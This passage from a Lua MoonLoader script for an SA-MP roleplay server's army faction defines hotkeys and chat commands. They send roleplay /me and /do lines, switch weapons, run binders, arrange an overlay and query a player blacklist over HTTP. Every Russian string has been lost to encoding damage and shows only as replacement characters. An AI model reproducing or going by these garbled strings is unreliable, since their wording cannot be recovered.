						local result, sid = sampGetPlayerSkin(myid)
						if not result then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ID ������ �����", 0xFFFF0000) return end
						if ((sid == 287 or sid == 191) and myclist ~= 7 and myclist ~= 0) or (myclist ~= 0 and (sid ~= 287 and sid ~= 191)) then
								sampSendChat("/me ����" .. RP .. " " .. config_ini.UserClist[myclist] .. "")
								wait(1300)
						end

						sampSendChat("/clist " .. res .. "")
						if ((tonumber(res) == 7) and ((sid == 287) or (sid == 191))) or (tonumber(res) == 0) then return end

						wait(1300)
						sampSendChat("/me �����" .. RP .. " " .. config_ini.UserClist[tonumber(res)] .. "")
				end
		)
end

function hk_11()
		lua_thread.create(
				function()
						math.randomseed(os.time())
						local var = math.random(1, 3)
						if var == 1 then
							 sampSendChat("/me ������" .. RP .. " ��-8")
							 wait(delay)
							 sampSendChat("/me ������" .. RP .. " ���� � ���� \"���������\"")
							 wait(delay)
							 sampSendChat("/do ���� ����� �� ����� ������� ����")
							 wait(delay)
							 sampSendChat("/do ���� ������� �� ����� ������� ������ ������")
							 wait(delay)
							 sampSendChat("/me ���������" .. RP .. " ����� ������� ������")
							 wait(delay)
							 sampSendChat("/do ���� �������" .. RP .. " ��-8 �������, ������� ��� � ��")
					elseif var == 2 then
							 sampSendChat("/me ������" .. RP .. " ��-8")
							 wait(delay)
							 sampSendChat("/me ������" .. RP .. " �������� �������� �������� � ����� � �����")
							 wait(delay)
							 sampSendChat("/do ���� ����� ��������-��������������")
							 wait(delay)
							 sampSendChat("/do ���� ����� �������� �����")
							 wait(delay)
							 sampSendChat("/me �������" .. RP .. " ����� �������, ������ �")
							 wait(delay)
							 sampSendChat("/do ���� ������� ��-8 �������, ������� ��� � ��")
					elseif var == 3 then
							 sampSendChat("/me ������" .. RP .. " ��-8")
							 wait(delay)
							 sampSendChat("/me ������" .. RP .. " ��������, ����� � ���")
							 wait(delay)
							 sampSendChat("/do ���� ��������� ����� ������� �����")
							 wait(delay)
							 sampSendChat("/do ���� ������� �������� �� ����� �������")
							 wait(delay)
							 sampSendChat("/me ������" .. RP .. " ��� �������")
							 wait(delay)
							 sampSendChat("/do ���� ������� ��-8 �������")
					end

					RKTimerTickCount = os.time()
			end
		)
end

function hk_12()
		lua_thread.create(
				function()
						sampSendChat("/me �������" .. RP .. " ������������� � �������� ����")
						wait(delay)
						isSending = true
						sampSendChat("/do � �������������: Army LV | " .. config_ini.Settings.PlayerFirstName .. " " .. config_ini.Settings.PlayerSecondName .. " | " .. config_ini.Settings.PlayerRank .. " | " .. PlayerU .. "")
						isSending = false
					end
		)
end

function hk_13()
		if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then sampSendChat("/lock") end
end

function hk_14()

end

function hk_16()

end

function hk_17()

end

function hk_18()

end

function hk_19()
		lua_thread.create(
				function()
						local valid, ped = getCharPlayerIsTargeting(PLAYER_HANDLE) -- �������� ����� ���������, � �������� ������� �����
						local id
						if not valid or not doesCharExist(ped) then -- ���� ���� ���� � �������� ����������
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� �� �������. �������� ���������� ����.", 0xFFFF0000)
								if not showdialog(1, "����� ������ � /members", "ID 0-999", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								local res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 999)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								id = tonumber(res)
						else
								local result, id = sampGetPlayerIdByCharHandle(ped) -- �������� samp-�� ������ �� ������ ���������
								if not result then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ID ����", 0xFFFF0000) return end
						end

						if not sampIsPlayerConnected(id) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
						local Members1Text = getMembersText()
						local nick = sampGetPlayerNickname(id)
						local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
						clist = clist == "ffff" and "fffafa" or clist
						for v in Members1Text:gmatch('[^\n]+') do
								local _, zv, afk = v:match("%[%d+%] %[(%d+)%] " .. nick .. "	(%W*) %[%d+%](.*)")
								if zv ~= nil then afk = afk == nil and "" or afk sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nick .. "[" .. id .. "] {FFFAFA}- " .. zv .. " " .. afk .. "", 0xFFFF0000) return end
						end

						sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}{" .. clist .. "}" .. nick .. "[" .. id .. "] {FFFAFA}- �� ������ � members", 0xFFFF0000)
				end
		)
end

function hk_20()
	lua_thread.create(function()
		wait(0)
		local A_Index = 0
		while true do
			if A_Index == 30 then break end
			local text = sampGetChatString(99 - A_Index)
			local re1
			if config_ini.bools[39] == 1 then re1 = regex.new(" \\{8470FF\\}(.*) \\{.*\\}(.*)\\_(.*)\\[(.*)\\]\\{8470FF\\}:  (.*)((.*)������(.*)���|(.*)������(.*)����(.*)���|(.*)������(.*)������(.*)|(.*)������(.*)����(.*)������(.*)|(.*)������(.*)����(.*)����(.*)|(.*)������(.*)����(.*)|(.*)������(.*)����(.*)���(.*)|(.*)������(.*)���(.*))") else re1 = regex.new(" (.*)  (.*)\\_(.*)\\[(.*)\\]:  (.*)((.*)������(.*)���|(.*)������(.*)����(.*)���|(.*)������(.*)������(.*)|(.*)������(.*)����(.*)������(.*)|(.*)������(.*)����(.*)����(.*)|(.*)������(.*)����(.*)|(.*)������(.*)����(.*)���(.*)|(.*)������(.*)���(.*))") end
			local zv, _, sname = re1:match(text)
			
			if zv ~= nil then
				local ranksnesokr = {["��.�������"] = "������� �������", ["��.�������"] = "������� �������", ["��.���������"] = "������� ���������", ["��.���������"] = "������� ���������"}
				local pRank = ranksnesokr[zv] ~= nil and ranksnesokr[zv] or zv
				sampSendChat("/f " .. tag .. " ������� �����, ������� " .. pRank .. " " .. sname .. "!")
				return
			end
			A_Index = A_Index + 1
		end
		
		sampSendChat("/f " .. tag .. " ������� �����!")
	end)
end

function hk_21()
		sampSendChat("/f " .. tag .. " SOS " .. kvadrat() .. "")
end

function hk_22()
		lua_thread.create(
				function()
						local res, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
						if not res then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ���� ID", 0xFFFF0000) return end
						local myclist = clists[sampGetPlayerColor(myid)]
						if myclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
						if myclist == 0 then
								sampSendChat("/clist " .. useclist .. "")
								wait(1300)
								local newmyclist = clists[sampGetPlayerColor(myid)]
								if newmyclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
								if newmyclist ~= tonumber(useclist) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �� ��� �����", 0xFFFF0000) return end
								sampSendChat("/me �����" .. RP .. " " .. config_ini.UserClist[newmyclist] .. "")
						else
								sampSendChat("/clist 0")
								wait(1300)
								local newmyclist = clists[sampGetPlayerColor(myid)]
								if newmyclist == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ����� ������ �����", 0xFFFF0000) return end
								if newmyclist ~= 0 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �� ��� ����", 0xFFFF0000) return end
								sampSendChat("/me ����" .. RP .. " " .. config_ini.UserClist[myclist] .. "")
						end
				end
		)
end

function hk_23()
		lua_thread.create(
				function()
						wait(0)
						if not showdialog(1, "���� ��������", "�������� �����\n[1] - ��������� ��������\n[2] - ���������� ��������\n[3] - ������ � ��������� ���������\n[4] - ������ � ������ ��/�������� � ����", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
						local res = waitForChooseInDialog(1)
						if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 1 or tonumber(res) > 4)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
						if type(tonumber(res)) ~= "number" or tonumber(res) < 1 or tonumber(res) > 4 then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ����� �� 1 �� 4.", 0xFFFF0000) return end
						local res = tonumber(res)
						if res == 1 then sampSendChat("/me ����" .. RP .. " ����� �� ������") wait(delay) sampSendChat("/me ��������" .. RP .. " ����� � ��������") end
						if res == 2 then sampSendChat("/me ����" .. RP .. " ����� � ���������") wait(delay) sampSendChat("/me ���������" .. RP .. " ����� �� �����") end
						if res == 3 then
								local A_Index = 0
								while true do
										if A_Index == 30 then break end
										local text = sampGetChatString(99 - A_Index)
										local sklad, kol = text:match(" �� ������ (.*)%: (%d%d%d)%d%d%d%/%d+")
										if sklad ~= nil then sampSendChat("/f " .. tag .. " ������������ �� ����� " .. sklad .. ", " .. kol .. " ����. ") return end
										A_Index = A_Index + 1
								end
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���������� ���������� ��������", 0xFFFF0000)
						end
						if res == 4 then
								local X, Y = getCharCoordinates(playerPed)
								if X >= 276 and Y >= 1799 and X <= 389 and Y <= 2014 then
										sampSendChat("/f " .. tag .. " �����, ��������, �������� ���")
								else
										sampSendChat("/f " .. tag .. " �����, ��������, ���������� ���")
								end
						end
				end
		)
end

function hk_24()

end

function hk_25()
		lua_thread.create(
				function()
						local valid, ped = getCharPlayerIsTargeting(PLAYER_HANDLE) -- �������� ����� ���������, � �������� ������� �����
						local id
						local nick = ""
						if not valid or not doesCharExist(ped) then -- ���� ���� ���� � �������� ����������
								sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� �� �������. �������� ���������� ����.", 0xFFFF0000)
								if not showdialog(1, "����� ������ � ��", "ID 0-999 ��� ���", "Ok") then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� �������� ����������� ����.", 0xFFFF0000) return end
								local res = waitForChooseInDialog(1)
								if not res or res == "" or (tonumber(res) ~= nil and (tonumber(res) < 0 or tonumber(res) > 999)) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��� ������.", 0xFFFF0000) return end
								if tonumber(res) == nil then nick = res else id = tonumber(res) end
						else
								local result, id = sampGetPlayerIdByCharHandle(ped) -- �������� samp-�� ������ �� ������ ���������
								if not result then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ������ ID ����", 0xFFFF0000) return end
						end

						if nick == "" then
								if not sampIsPlayerConnected(id) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� �������", 0xFFFF0000) return end
								nick = sampGetPlayerNickname(id)
								id = tostring(id)
						else
								id = sampGetPlayerIdByNickname(nick) ~= nil and tostring(sampGetPlayerIdByNickname(nick)) or "-1"
						end

						if config_ini.bools[2] == 1 then
								sampSendChat("/me ������" .. RP .. " ����� �� ������ OPSAT")
								wait(delay)
								sampSendChat("/me ��������" .. RP .. " ����� � ������ ������ ����� �� �� �����")
						end

						local url = 'http://srp-addons.ru/api/log.php?checkbl=' ..  nick .. '&f=Army%20LV&s=95.181.158.63:7777'
						local responsetext = u8:decode(decodebase64(req(url)))
						local arr = decodeJson(responsetext:match("%[(.*)%]"))
						if arr ~= nil then
							sampAddChatMessage("{FF8300}-----------=== ������ ������ Las-Venturas army ===-----------", 0xFFFF0000)
							sampAddChatMessage("{FF8300}�����: {FFFFFF}" .. nick .. " [" .. id .. "]{FF0000} ������ � ������ ������", 0xFFFF0000)
							sampAddChatMessage("{FF8300}�������: {FFFFFF}" .. arr.reason .. "", 0xFFFF0000)
							sampAddChatMessage("{FF8300}��� ����: {FFFFFF}" .. arr.user .. "", 0xFFFF0000)
							sampAddChatMessage("{FF8300}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", 0xFFFF0000)
						else
							sampAddChatMessage("{FF8300}Black List: �����: {FFFFFF}" .. nick .. " [" .. id .. "]{33AA33} � ������ ������ �� ������", 0xFFFF0000)
						end
				end
		)
end

function hk_26()
		lua_thread.create(
				function()
						sampSendChat("������� �����!")
						if config_ini.bools[3] ~= 1 then return end
						local res, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
						if res then
								local res, sid = sampGetPlayerSkin(myid)
								if res and (sid == 191 or sid == 287) and not isCharInAnyCar(PLAYER_PED) then
									wait(delay)
									sampSendChat("q")
								end
						end
				end
		)
end

function hk_27()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[1])
						if SB == nil then return end
						if (config_ini.bools[4] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_28()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[2])
						if SB == nil then return end
						if (config_ini.bools[5] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_29()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[3])
						if SB == nil then return end
						if (config_ini.bools[6] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_30()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[4])
						if SB == nil then return end
						if (config_ini.bools[7] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_31()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[5])
						if SB == nil then return end
						if (config_ini.bools[8] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_32()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[6])
						if SB == nil then return end
						if (config_ini.bools[9] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_33()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[7])
						if SB == nil then return end
						if (config_ini.bools[10] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_34()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[8])
						if SB == nil then return end
						if (config_ini.bools[11] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_35()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[9])
						if SB == nil then return end
						if (config_ini.bools[12] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_36()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[10])
						if SB == nil then return end
						if (config_ini.bools[13] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_37()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[11])
						if SB == nil then return end
						if (config_ini.bools[14] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_38()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[12])
						if SB == nil then return end
						if (config_ini.bools[15] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_39()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[13])
						if SB == nil then return end
						if (config_ini.bools[16] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_40()
		lua_thread.create(
				function()
						wait(0)
						local SB = formatbind(config_ini.UserBinder[14])
						if SB == nil then return end
						if (config_ini.bools[17] == 1) then
								for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
						else
								sampSetChatInputEnabled(true)
								sampSetChatInputText(SB[1])
						end
				end
		)
end

function hk_41()
	if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then needtohold = not needtohold end
end

function hk_42()
		lua_thread.create(
				function()
						local tarr = {}
						for k, v in ipairs(config_ini.rphr) do if v ~= "" then table.insert(tarr, v) end end
						math.randomseed(os.time())
						local num = math.random(1, table.maxn(tarr))
						if num == lastrand then if num == table.maxn(tarr) then num = 1 else num = num + 1 end end
						local SB = formatbind(tarr[num])
						if SB == nil then return end
						lastrand = num
						for k, v in ipairs(SB) do sampSendChat(v) wait(delay) end
				end
		)
end

function hk_43()
		if not SetMode then
				-- ��� ����� ����� ������� �������
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ ��������� �������������� ��������� overlay", 0xFFFF0000)
				if isCharInAnyCar(PLAYER_PED) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������ �� ����� �������� ��� ��������� ��������", 0xFFFF0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}��� ������ �� ����� ���� ��������� ���������� ����� � ���������", 0xFFFF0000) end
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���������� �������� � ������ ����� � ������� ������� ��������� - ���������� ���������� ���������", 0xFFFF0000)
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}��� ������ ���� ��������� ������� ������� ������ ����", 0xFFFF0000)
				config_ini.bools[25], config_ini.bools[26], config_ini.bools[27], config_ini.bools[28], config_ini.bools[29], config_ini.bools[30], config_ini.bools[31], config_ini.bools[32], config_ini.bools[33], config_ini.bools[34], config_ini.bools[35], config_ini.bools[36], config_ini.bools[41], config_ini.bools[43], config_ini.bools[44], config_ini.bools[52] = 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1
				if access.alevel == 3 or access.alevel == 6 then config_ini.bools[58] = 1 end
				SetMode, SetModeFirstShow = true, true
				imgui.ShowCursor, imgui.LockPlayer = true, true
		else
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���������� ���������", 0xFFFF0000)
				config_ini.ovCoords.show_timeX, config_ini.ovCoords.show_timeY = s_coord["s_time"].x, s_coord["s_time"].y
				config_ini.ovCoords.show_placeX, config_ini.ovCoords.show_placeY = s_coord["s_place"].x, s_coord["s_place"].y
				config_ini.ovCoords.show_nameX, config_ini.ovCoords.show_nameY = s_coord["s_name"].x, s_coord["s_name"].y
				if isCharInAnyCar(PLAYER_PED) then config_ini.ovCoords.show_vehX, config_ini.ovCoords.show_vehY = s_coord["s_veh"].x, s_coord["s_veh"].y end
				config_ini.ovCoords.show_hpX, config_ini.ovCoords.show_hpY = s_coord["s_hp"].x, s_coord["s_hp"].y
				config_ini.ovCoords.crosCarX, config_ini.ovCoords.crosCarY = s_coord["s_targetCar"].x, s_coord["s_targetCar"].y
				config_ini.ovCoords.show_targetImageX, config_ini.ovCoords.show_targetImageY = s_coord["s_target"].x, s_coord["s_target"].y
				config_ini.ovCoords.show_rkX, config_ini.ovCoords.show_rkY = s_coord["s_rk"].x, s_coord["s_rk"].y
				config_ini.ovCoords.show_afkX, config_ini.show_afkY = s_coord["s_afk"].x, s_coord["s_afk"].y
				config_ini.ovCoords.show_tecinfoX, config_ini.ovCoords.show_tecinfoY = s_coord["s_tecinfo"].x, s_coord["s_tecinfo"].y
				config_ini.ovCoords.show_squadX, config_ini.ovCoords.show_squadY = s_coord["s_squad"].x, s_coord["s_squad"].y
				config_ini.ovCoords.show_500X, config_ini.ovCoords.show_500Y = s_coord["s_500"].x, s_coord["s_500"].y
				config_ini.ovCoords.show_dindX, config_ini.ovCoords.show_dindY = s_coord["s_dind"].x, s_coord["s_dind"].y
				config_ini.ovCoords.show_damX, config_ini.ovCoords.show_damY = s_coord["s_dam"].x, s_coord["s_dam"].y
				config_ini.ovCoords.show_deathX, config_ini.ovCoords.show_deathY = s_coord["s_death"].x, s_coord["s_death"].y
				if access.alevel == 3 or access.alevel == 6 then config_ini.ovCoords.show_moneyX, config_ini.ovCoords.show_moneyY = s_coord["s_money"].x, s_coord["s_money"].y end

				config_ini.bools[25] = togglebools.tab_overlay[1].v and 1 or 0
				config_ini.bools[26] = togglebools.tab_overlay[2].v and 1 or 0
				config_ini.bools[27] = togglebools.tab_overlay[3].v and 1 or 0
				config_ini.bools[28] = togglebools.tab_overlay[4].v and 1 or 0
				config_ini.bools[29] = togglebools.tab_overlay[5].v and 1 or 0
				config_ini.bools[30] = togglebools.tab_overlay[6].v and 1 or 0
				config_ini.bools[31] = togglebools.tab_overlay[7].v and 1 or 0
				config_ini.bools[32] = togglebools.tab_overlay[8].v and 1 or 0
				config_ini.bools[33] = togglebools.tab_overlay[9].v and 1 or 0
				config_ini.bools[34] = togglebools.tab_overlay[10].v and 1 or 0
				config_ini.bools[35] = togglebools.tab_overlay[11].v and 1 or 0
				config_ini.bools[36] = togglebools.tab_overlay[12].v and 1 or 0
				config_ini.bools[41] = togglebools.tab_overlay[15].v and 1 or 0
				config_ini.bools[43] = togglebools.tab_overlay[16].v and 1 or 0
				config_ini.bools[44] = togglebools.tab_overlay[17].v and 1 or 0
				config_ini.bools[52] = togglebools.tab_overlay[18].v and 1 or 0
				config_ini.bools[54] = togglebools.tab_overlay[19].v and 1 or 0
				config_ini.bools[58] = togglebools.tab_moder[1].v and 1 or 0
				SetMode, SetModeFirstShow, imgui.ShowCursor, imgui.LockPlayer = false, false, false, false
				needtosave = true
				--s_target, s_targetCar, s_hp, s_veh, s_name, s_place, s_time, s_rk, s_afk, s_tecinfo, s_500, s_dind, s_dam, s_death, s_money
		end
end


function hk_45() if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then setCurrentCharWeapon(PLAYER_PED, 0) end end -- first
function hk_46() if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then local id = getAmmoInCharWeapon(PLAYER_PED, 24) > 0 and 24 or getAmmoInCharWeapon(PLAYER_PED, 23) > 0 and 23 or 0 if id ~= 0 then setCurrentCharWeapon(PLAYER_PED, id) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ����� ������ � ��������� ���������.") end end end -- deagle
function hk_47() if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then setCurrentCharWeapon(PLAYER_PED, 25) end end -- shotgun
function hk_48() if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then setCurrentCharWeapon(PLAYER_PED, 29) end end -- smg
function hk_49() if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then local id = getAmmoInCharWeapon(PLAYER_PED, 31) > 0 and 31 or getAmmoInCharWeapon(PLAYER_PED, 30) > 0 and 30 or 0 if id ~= 0 then setCurrentCharWeapon(PLAYER_PED, id) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� ����� ������ � ��������� ���������.") end end end -- m4
function hk_50() if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then setCurrentCharWeapon(PLAYER_PED, 33) end end -- rifle
function hk_51() if not sampIsChatInputActive() and not sampIsDialogActive(-1) and not isSampfuncsConsoleActive() then setCurrentCharWeapon(PLAYER_PED, 46) end end -- par

function cmd_ob(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[1] .. " [����������] [�������/0 - ������� �������] [1-3]", 0xFFFF0000) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}1 - ��������(�) ������(�); 2 - �������� �� ������; 3 - ��������� ��������� � ���� ��������", 0xFFFF0000) return end
		local params = {}
		for v in string.gmatch(sparams, "[^%s]+") do table.insert(params, v) end
		local zzz = {[1] = "��������� ������������", [2] = "��� �������� �������������", [3] = "��� �������� �������������", [4] = "������ �������� �������������", [5] = "���� ��������� �������������", [6] = "����� ��������� �������������", [7] = "���� ��������� �������������", [8] = "������ ��������� �������������", [9] = "������ ��������� �������������", [10] = "������ ��������� �������������"}
		if tonumber(params[1]) == nil or zzz[tonumber(params[1])] == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ���������� ���������.", 0xFFFF0000) return end
		local kol = tonumber(params[1])
		if params[2] == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
		local b, n = params[2]:match("([�-�])-(%d+)")
		if (b == nil or (tonumber(n) < 1 or tonumber(n) > 24)) and (tonumber(params[2]) ~= 0) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������.", 0xFFFF0000) return end
		local kv = tonumber(params[2]) == 0 and kvadrat() or "" .. b .. "-" .. n .. ""
		if tonumber(params[3]) == nil or (tonumber(params[3]) < 1 or tonumber(params[3]) > 3) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� �������� �3.", 0xFFFF0000) return end

		local obdokl = "/r " .. tag .. " " .. zzz[kol] ..  ""
		local obdokl2 = " � �������� " .. kv .. "."
		local obdokl3
		if tonumber(params[3]) == 2 then obdokl3 = "" elseif tonumber(params[3]) == 3 or kol == 1 then obdokl3 = " �������� ������" elseif tonumber(params[3]) == 1 and kol > 1 then obdokl3 = " ��������� �������" end
		local dokl = obdokl .. obdokl2 .. obdokl3
		sampSendChat(dokl)
end

function cmd_sopr(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[2] .. " [����� ����������/0 - �����]", 0xFFFF0000) return end
		local x, y, z = getCharCoordinates(PLAYER_PED)
		local zone = calculateZone(x, y, z)
		local arr = {
				["1"] = "Police LS", ["ls"] = "Police LS", ["lspd"] = "Police LS", ["��"] = "Police LS", ["����"] = "Police LS",
				["2"] = "Police SF", ["sfpd"] = "Police SF", ["����"] = "Police SF",
				["3"] = "Police LV", ["lv"] = "Police LV", ["lvpd"] = "Police LV", ["��"] = "Police LV", ["����"] = "Police LV",
				["4"] = "FBI", ["fbi"] = "FBI", ["���"] = "FBI",
				["5"] = "Army SF", ["sfa"] = "Army SF", ["���"] = "Army SF",
				["6"] = "�. San-Fierro", ["sf"] = "�. San-Fierro", ["��"] = "�. San-Fierro"
		}

		if arr[sparams] == nil and sparams ~= "0" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������", 0xFFFF0000) return end
		if zone == "Restricted Area" then
				if sparams == "0" then sampSendChat("/f " .. tag .. " ������� � ������������� ���") return end
				sampSendChat("/f " .. tag .. " ������� � ������������� ������ ��� �� " .. arr[sparams] .. "")
		else
				if sparams == "0" then sampSendChat("/f " .. tag .. " ������� �������, ������������") return end
				sampSendChat("/f " .. tag .. " ������� ������� � �������� " .. kvadrat() .. ", ������������ �� " .. arr[sparams] .. "")
		end
end

function cmd_zgruz(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[3] .. " [����� ����������/0 - �����]", 0xFFFF0000) return end
		local arr = {
				["1"] = "�� ����", ["lva"] = "�� ����", ["���"] = "�� ����",
				["2"] = "� Police LS", ["ls"] = "� Police LS", ["lspd"] = "� Police LS", ["��"] = "� Police LS", ["����"] = "� Police LS",
				["3"] = "� Police SF", ["sfpd"] = "� Police SF", ["����"] = "� Police SF",
				["4"] = "� Police LV", ["lv"] = "� Police LV", ["lvpd"] = "� Police LV", ["��"] = "� Police LV", ["����"] = "� Police LV",
				["5"] = "� FBI", ["fbi"] = "� FBI", ["���"] = "� FBI",
				["6"] = "� Army SF", ["sfa"] = "� Army SF", ["���"] = "� Army SF",
				["7"] = "� �. San-Fierro", ["sf"] = "� �. San-Fierro", ["��"] = "� �. San-Fierro"
		}

		if arr[sparams] == nil and sparams ~= "0" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ������ ����� ����������", 0xFFFF0000) return end
		local kv = kvadrat()
		lastKV.m = kv
		sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������� " .. lastKV.m .. ".", 0xFFFF0000)
		if sparams == "0" then sampSendChat("/f " .. tag .. " ������� ��������, ����� ������") return end
		sampSendChat("/f " .. tag .. " ������� �������� � �������� " .. kv .. ", ����� " .. arr[sparams] .. "")
end

function cmd_rgruz(sparams)
		if sparams == "" then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������. ������� /" .. config_ini.Commands[4] .. " [����� ����������/0 - �����]", 0xFFFF0000) return end
		local arr = {
